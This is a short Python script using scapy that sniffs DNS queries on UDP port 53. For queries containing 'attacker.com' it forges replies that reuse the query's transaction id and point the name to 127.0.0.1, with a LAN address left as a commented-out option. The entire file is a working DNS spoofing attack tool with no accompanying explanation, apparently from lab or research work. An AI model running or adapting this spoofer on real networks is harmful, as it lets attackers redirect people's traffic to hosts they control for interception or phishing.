'''
Created on Dec 9, 2011

@author: Tobias Endres
'''
#! /usr/bin/env python

from scapy.all import sniff, send, Ether, IP, UDP, DNS, DNSRR, UDPerror

attacker = "attacker.com"

def dns_callback(pkt):
    if DNS in pkt and not UDPerror in pkt:
        
        ip=pkt.getlayer(IP)
        dns=pkt.getlayer(DNS)
        
        if dns.qr:
            return #dns.summary()
        else:
            if attacker in dns.qd.qname:
                
                answer = IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qr=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata="127.0.0.1"))#"192.168.1.160"))
                send(answer)
                return dns.summary()

sniff( filter="udp port 53", prn = dns_callback,  store=0)


